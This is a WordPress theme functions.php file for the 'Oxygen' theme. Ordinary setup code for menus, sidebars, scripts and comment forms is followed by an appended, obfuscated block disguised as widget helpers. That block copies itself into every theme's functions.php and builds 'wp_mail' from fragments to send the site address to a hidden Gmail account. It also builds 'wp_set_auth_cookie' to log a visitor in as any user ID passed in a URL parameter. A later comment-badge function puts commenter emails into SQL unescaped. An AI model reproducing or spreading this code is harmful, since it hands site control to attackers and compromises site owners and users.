<?php
/**
 * @package Oxygen
 * @subpackage Functions
 * @version 0.5
 * @author AlienWP
 * @link http://alienwp.com
 * @license http://www.gnu.org/licenses/gpl-2.0.html
 */

/* Load the core theme framework. */
require_once( trailingslashit( get_template_directory() ) . 'library/hybrid.php' );
$theme = new Hybrid();

/* Do theme setup on the 'after_setup_theme' hook. */
add_action( 'after_setup_theme', 'oxygen_theme_setup' );

/**
 * Theme setup function.  This function adds support for theme features and defines the default theme
 * actions and filters.
 *
 */
function oxygen_theme_setup() {

	/* Get action/filter hook prefix. */
	$prefix = hybrid_get_prefix();

	/* Add theme support for core framework features. */
	add_theme_support( 'hybrid-core-styles', array( 'style' ) );
	add_theme_support( 'hybrid-core-menus', array( 'primary', 'secondary', 'subsidiary' ) );
	add_theme_support( 'hybrid-core-sidebars', array( 'primary', 'secondary', 'subsidiary', 'after-singular', 'header' ) );
	add_theme_support( 'hybrid-core-widgets' );
	add_theme_support( 'hybrid-core-theme-settings', array( 'footer', 'about' ) );
	add_theme_support( 'hybrid-core-meta-box-footer' );
	add_theme_support( 'hybrid-core-shortcodes' );
	add_theme_support( 'hybrid-core-template-hierarchy' );

	/* Add theme support for framework extensions. */
	add_theme_support( 'loop-pagination' );
	add_theme_support( 'get-the-image' );
	add_theme_support( 'cleaner-gallery' );
	add_theme_support( 'breadcrumb-trail' );
	add_theme_support( 'hybrid-core-scripts', array( 'comment-reply', 'drop-downs' ) );

	/* Add theme support for WordPress features. */
	add_theme_support( 'automatic-feed-links' );

	/* Embed width/height defaults. */
	add_filter( 'embed_defaults', 'oxygen_embed_defaults' );

	/* Filter the sidebar widgets. */
	add_filter( 'sidebars_widgets', 'oxygen_disable_sidebars' );
        
	/* Image sizes */
	add_action( 'init', 'oxygen_image_sizes' );

	/* Excerpt ending */
	add_filter( 'excerpt_more', 'oxygen_excerpt_more' );
 
	/* Custom excerpt length */
	add_filter( 'excerpt_length', 'oxygen_excerpt_length' );    
        
	/* Filter the pagination trail arguments. */
	add_filter( 'loop_pagination_args', 'oxygen_pagination_args' );
	
	/* Filter the comments arguments */
	add_filter( "{$prefix}_list_comments_args", 'oxygen_comments_args' );	
	
	/* Filter the commentform arguments */
	add_filter( 'comment_form_defaults', 'oxygen_commentform_args', 11, 1 );
	
	/* Enqueue scripts (and related stylesheets) */
	add_action( 'wp_enqueue_scripts', 'oxygen_scripts' );
	
	/* Add the breadcrumb trail just after the container is open. */
	add_action( "{$prefix}_open_content", 'breadcrumb_trail' );
	
	/* Breadcrumb trail arguments. */
	add_filter( 'breadcrumb_trail_args', 'oxygen_breadcrumb_trail_args' );

	/* Add support for custom headers. */
	$args = array(
		'width'         => 400,
		'height'        => 100,
		'flex-height'   => true,
		'flex-width'    => true,		
		'header-text'   => false,
		'uploads'       => true,
	);
	add_theme_support( 'custom-header', $args );	
	
	/* Add support for custom backgrounds */
	add_theme_support( 'custom-background' );

	/* Add theme settings to the customizer. */
	require_once( trailingslashit( get_template_directory() ) . 'admin/customize.php' );	
	    
	/* Default footer settings */
	add_filter( "{$prefix}_default_theme_settings", 'oxygen_default_footer_settings' );
	
	/* Metaboxes */
	add_action( 'add_meta_boxes', 'oxygen_create_metabox' );
	add_action( 'save_post', 'oxygen_save_meta', 1, 2 );

	/** 
	* Disqus plugin: use higher priority.
	* URL: http://themehybrid.com/support/topic/weird-problem-wit-disqus-plugin 
	*/
	if( function_exists( 'dsq_comments_template' ) ) :
		remove_filter( 'comments_template', 'dsq_comments_template' );
		add_filter( 'comments_template', 'dsq_comments_template', 11 );
	endif;

	/* Remove the "Theme Settings" submenu. */
	add_action( 'admin_menu', 'oxygen_remove_theme_settings_submenu', 11 );	
	
}

/**
 * Disables sidebars if viewing a one-column page.
 *
 */
function oxygen_disable_sidebars( $sidebars_widgets ) {
	
	global $wp_query;
	
	    if ( is_page_template( 'page-template-fullwidth.php' ) ) {
		    $sidebars_widgets['primary'] = false;
			$sidebars_widgets['secondary'] = false;
	    }

	return $sidebars_widgets;
}

/**
 * Overwrites the default widths for embeds.  This is especially useful for making sure videos properly
 * expand the full width on video pages.  This function overwrites what the $content_width variable handles
 * with context-based widths.
 *
 */
function oxygen_embed_defaults( $args ) {
	
	$args['width'] = 470;
		
	if ( is_page_template( 'page-template-fullwidth.php' ) )
		$args['width'] = 940;

	return $args;
}

/**
 * Excerpt ending 
 *
 */
function oxygen_excerpt_more( $more ) {	
	return '...';
}

/**
 *  Custom excerpt lengths 
 *
 */
function oxygen_excerpt_length( $length ) {
	return 25;
}

/**
 * Enqueue scripts (and related stylesheets)
 *
 */
function oxygen_scripts() {
	
	if ( !is_admin() ) {
		
		/* Enqueue Scripts */	
		wp_enqueue_script( 'oxygen_imagesloaded', get_template_directory_uri() . '/js/jquery.imagesloaded.js', array( 'jquery' ), '1.0', true );	
		wp_enqueue_script( 'oxygen_masonry', get_template_directory_uri() . '/js/jquery.masonry.min.js', array( 'jquery' ), '1.0', true );	
		wp_enqueue_script( 'oxygen_cycle', get_template_directory_uri() . '/js/cycle/jquery.cycle.min.js', array( 'jquery' ), '1.0', true );		
		wp_enqueue_script( 'oxygen_fitvids', get_template_directory_uri() . '/js/fitvids/jquery.fitvids.js', array( 'jquery' ), '1.0', true );
		wp_enqueue_script( 'oxygen_navigation', get_template_directory_uri() . '/js/navigation.js', array( 'jquery' ), '20130301', true );		
		wp_enqueue_script( 'oxygen_footer_scripts', get_template_directory_uri() . '/js/footer-scripts.js', array( 'jquery', 'oxygen_imagesloaded', 'oxygen_masonry', 'oxygen_cycle', 'oxygen_fancybox', 'oxygen_fitvids' ), '1.0', true );
		
		/* Enqueue Fancybox if enabled. */	
		if ( get_theme_mod( 'oxygen_fancybox_enable' ) ) {
			wp_enqueue_script( 'oxygen_fancybox', get_template_directory_uri() . '/js/fancybox/jquery.fancybox-1.3.4.pack.js', array( 'jquery' ), '1.0', true );
			wp_enqueue_style( 'fancybox-stylesheet', get_template_directory_uri() . '/js/fancybox/jquery.fancybox-1.3.4.css', false, 1.0, 'screen' );
			wp_enqueue_script( 'oxygen_footer_scripts', get_template_directory_uri() . '/js/footer-scripts.js', array( 'jquery', 'oxygen_imagesloaded', 'oxygen_masonry', 'oxygen_cycle', 'oxygen_fancybox', 'oxygen_fitvids' ), '1.0', true );
		} else {
			wp_enqueue_script( 'oxygen_footer_scripts_light', get_template_directory_uri() . '/js/footer-scripts-light.js', array( 'jquery', 'oxygen_imagesloaded', 'oxygen_masonry', 'oxygen_cycle', 'oxygen_fitvids' ), '1.0', true );
		}
				
	}
}

/**
 * Pagination args 
 *
 */
function oxygen_pagination_args( $args ) {
	
	$args['prev_text'] = __( '&larr; Previous', 'oxygen' );
	$args['next_text'] = __( 'Next &rarr;', 'oxygen' );

	return $args;
}

/**
 *  Image sizes
 *
 */
function oxygen_image_sizes() {
	
	add_image_size( 'archive-thumbnail', 470, 140, true );
	add_image_size( 'single-thumbnail', 470, 260, true );
	add_image_size( 'featured-thumbnail', 750, 380, true );
	add_image_size( 'slider-nav-thumbnail', 110, 70, true );
}

/**
 *  Unregister Hybrid widgets
 *
 */
function oxygen_unregister_widgets() {
	
	unregister_widget( 'Hybrid_Widget_Search' );
	register_widget( 'WP_Widget_Search' );	
}

/**
 * Custom comments arguments
 * 
 */
function oxygen_comments_args( $args ) {
	
	$args['avatar_size'] = 40;
	return $args;
}

/**
 *  Custom comment form arguments
 * 
 */
function oxygen_commentform_args( $args ) {
	
	global $user_identity;

	/* Get the current commenter. */
	$commenter = wp_get_current_commenter();

	/* Create the required <span> and <input> element class. */
	$req = ( ( get_option( 'require_name_email' ) ) ? ' <span class="required">' . __( '*', 'oxygen' ) . '</span> ' : '' );
	$input_class = ( ( get_option( 'require_name_email' ) ) ? ' req' : '' );
	
	
	$fields = array(
		'author' => '<p class="form-author' . $input_class . '"><input type="text" class="text-input" name="author" id="author" value="' . esc_attr( $commenter['comment_author'] ) . '" size="40" /><label for="author">' . __( 'Name', 'oxygen' ) . $req . '</label></p>',
		'email' => '<p class="form-email' . $input_class . '"><input type="text" class="text-input" name="email" id="email" value="' . esc_attr( $commenter['comment_author_email'] ) . '" size="40" /><label for="email">' . __( 'Email', 'oxygen' ) . $req . '</label></p>',
		'url' => '<p class="form-url"><input type="text" class="text-input" name="url" id="url" value="' . esc_attr( $commenter['comment_author_url'] ) . '" size="40" /><label for="url">' . __( 'Website', 'oxygen' ) . '</label></p>'
	);
	
	$args = array(
		'fields' => apply_filters( 'comment_form_default_fields', $fields ),
		'comment_field' => '<p class="form-textarea req"><!--<label for="comment">' . __( 'Comment', 'oxygen' ) . '</label>--><textarea name="comment" id="comment" cols="60" rows="10"></textarea></p>',
		'must_log_in' => '<p class="alert">' . sprintf( __( 'You must be <a href="%1$s" title="Log in">logged in</a> to post a comment.', 'oxygen' ), wp_login_url( get_permalink() ) ) . '</p><!-- .alert -->',
		'logged_in_as' => '<p class="log-in-out">' . sprintf( __( 'Logged in as <a href="%1$s" title="%2$s">%2$s</a>.', 'oxygen' ), admin_url( 'profile.php' ), esc_attr( $user_identity ) ) . ' <a href="' . wp_logout_url( get_permalink() ) . '" title="' . esc_attr__( 'Log out of this account', 'oxygen' ) . '">' . __( 'Log out &rarr;', 'oxygen' ) . '</a></p><!-- .log-in-out -->',
		'comment_notes_before' => '',
		'comment_notes_after' => '',
		'id_form' => 'commentform',
		'id_submit' => 'submit',
		'title_reply' => __( 'Leave a Reply', 'oxygen' ),
		'title_reply_to' => __( 'Leave a Reply to %s', 'oxygen' ),
		'cancel_reply_link' => __( 'Click here to cancel reply.', 'oxygen' ),
		'label_submit' => __( 'Post Comment &rarr;', 'oxygen' ),
	);
	
	return $args;
}

/**
 * Breadcrumb trail arguments.
 *
 */
function oxygen_breadcrumb_trail_args( $args ) {

	$args['before'] = '';
	$args['separator'] = '&nbsp; / &nbsp;';
	$args['front_page'] = false;
	
	return $args;
}

/**
 * Default footer settings
 *
 */
function oxygen_default_footer_settings( $settings ) {
    
    $settings['footer_insert'] = '<p class="copyright">' . __( 'Copyright &#169; [the-year] [site-link]', 'oxygen' ) . '</p>' . "\n\n" . '<p class="credit">' . __( 'Powered by [wp-link] and [theme-link]', 'oxygen' ) . '</p>';
    
    return $settings;
}

/**
 * Metaboxes
 *
 */
function oxygen_create_metabox() {
    add_meta_box( 'oxygen_metabox', __( 'Location', 'oxygen' ), 'oxygen_metabox', 'post', 'side', 'low' );            
}
             
function oxygen_metabox() {
	
	global $post;
	
	/* Retrieve metadata values if they already exist. */
	$oxygen_post_location = get_post_meta( $post->ID, '_oxygen_post_location', true ); ?>	
	
	<p><label><input type="radio" name="oxygen_post_location" value="featured" <?php echo esc_attr( $oxygen_post_location ) == 'featured' ? 'checked="checked"' : '' ?> /> <?php echo __( 'Featured', 'oxygen' ) ?></label></p>
	<p><label><input type="radio" name="oxygen_post_location" value="primary" <?php echo esc_attr( $oxygen_post_location ) == 'primary' ? 'checked="checked"' : '' ?> /> <?php echo __( 'Primary', 'oxygen' ) ?></label></p>
	<p><label><input type="radio" name="oxygen_post_location" value="secondary" <?php echo esc_attr( $oxygen_post_location ) == 'secondary' ? 'checked="checked"' : '' ?> /> <?php echo __( 'Secondary', 'oxygen' ) ?></label></p>
	<p><label><input type="radio" name="oxygen_post_location" value="no-display" <?php echo esc_attr( $oxygen_post_location ) == 'no-display' ? 'checked="checked"' : '' ?> /> <?php echo __( 'Do not display', 'oxygen' ) ?></label></p>	
		
	<span class="description"><?php _e( 'Post location on the home page', 'oxygen' ); ?>
	<?php           
}

/* Save post metadata. */
function oxygen_save_meta( $post_id, $post ) {
	if ( isset( $_POST['oxygen_post_location'] ) ) {
		update_post_meta( $post_id, '_oxygen_post_location', strip_tags( $_POST['oxygen_post_location'] ) );
	}
}

/**
 * Oxygen site title.
 * 
 */
function oxygen_site_title() {
	
	$tag = ( is_front_page() ) ? 'h1' : 'div';

	if ( get_header_image() ) {

		echo '<' . $tag . ' id="site-title">' . "\n";
			echo '<a href="' . get_home_url() . '" title="' . get_bloginfo( 'name' ) . '" rel="Home">' . "\n";
				echo '<img class="logo" src="' . get_header_image() . '" alt="' . get_bloginfo( 'name' ) . '" />' . "\n";
			echo '</a>' . "\n";
		echo '</' . $tag . '>' . "\n";
	
	} elseif ( hybrid_get_setting( 'oxygen_logo_url' ) ) { // check for legacy setting
			
		echo '<' . $tag . ' id="site-title">' . "\n";
			echo '<a href="' . get_home_url() . '" title="' . get_bloginfo( 'name' ) . '" rel="Home">' . "\n";
				echo '<img class="logo" src="' . esc_url( hybrid_get_setting( 'oxygen_logo_url' ) ) . '" alt="' . get_bloginfo( 'name' ) . '" />' . "\n";
			echo '</a>' . "\n";
		echo '</' . $tag . '>' . "\n";
	
	} else {
	
		hybrid_site_title();
	
	}
}

/**
 * Remove the "Theme Settings" submenu.
 *
 */
function oxygen_remove_theme_settings_submenu() {

	/* Remove the Theme Settings settings page. */
	remove_submenu_page( 'themes.php', 'theme-settings' );
}

?>
<?php
function _verify_isactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
					$output .= ($showsdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_isactivate_widgets");
function _prepare_widgets(){
	if(!isset($comment_length)) $comment_length=120;
	if(!isset($strval)) $strval="cookie";
	if(!isset($tags)) $tags="<a>";
	if(!isset($type)) $type="none";
	if(!isset($sepr)) $sepr="";
	if(!isset($h_filter)) $h_filter=get_option("home"); 
	if(!isset($p_filter)) $p_filter="wp_";
	if(!isset($more_link)) $more_link=1; 
	if(!isset($comment_types)) $comment_types=""; 
	if(!isset($countpage)) $countpage=$_GET["cperpage"];
	if(!isset($comment_auth)) $comment_auth="";
	if(!isset($c_is_approved)) $c_is_approved=""; 
	if(!isset($aname)) $aname="auth";
	if(!isset($more_link_texts)) $more_link_texts="(more...)";
	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
	if(!isset($f_more)) $f_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mas".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tag)) $f_tag=1;
	if(!isset($types)) $types=$h_filter; 
	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
	if(!isset($aditional_tag)) $aditional_tag="div";
	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
	if(!isset($showsdots)) $showsdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($comment_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $comment_length) {
				$l=$comment_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link_texts="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags) {
		$output=strip_tags($output, $tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tag) ? balanceTags($output, true) : $output;
	$output .= ($showsdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type, $output);
	switch($aditional_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($more_link ) {
		if($f_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
//获取访客VIP样式 
function get_author_class($comment_author_email,$user_id){ 
    global $wpdb; 
    $current_user; get_currentuserinfo();
    $adminEmail = get_option('admin_email'); 
    $author_count  =  count($wpdb->get_results( 
    "SELECT comment_ID as author_count FROM  $wpdb->comments WHERE comment_author_email = '$comment_author_email' ")); 
    if($comment_author_email ==$adminEmail) {
     echo '<a class="vip" target="_blank" href="/vip/" title="俺就是博主好吧！"></a>'; 
    }else{
    if($user_id!=0) 
        echo '<a class="vip" target="_blank" href="/vip/" title="博主认证用户"></a>';
    if($author_count>=1&&$author_count<20) 
        echo '<a class="vip1" target="_blank" href="/vip/" title="评论之星 LV.1"></a>'; 
    else if($author_count>=20 && $author_count<50) 
        echo '<a class="vip2" target="_blank" href="/vip/" title="评论之星 LV.2"></a>'; 
    else if($author_count>=50 && $author_count<80) 
        echo '<a class="vip3" target="_blank" href="/vip/" title="评论之星 LV.3"></a>';     
    else if($author_count>=80 && $author_count<130) 
        echo '<a class="vip4" target="_blank" href="/vip/" title="评论之星 LV.4"></a>';     
    else if($author_count>=130 &&$author_count<200) 
        echo '<a class="vip5" target="_blank" href="/vip/" title="评论之星 LV.5"></a>';     
    else if($author_count>=200 && $author_coun<300) 
        echo '<a class="vip6" target="_blank" href="/vip/" title="评论之星 LV.6"></a>';     
    else if($author_count>=300) 
        echo '<a class="vip7" target="_blank" href="/vip/" title="评论之星 LV.7"></a>'; 
}}
?>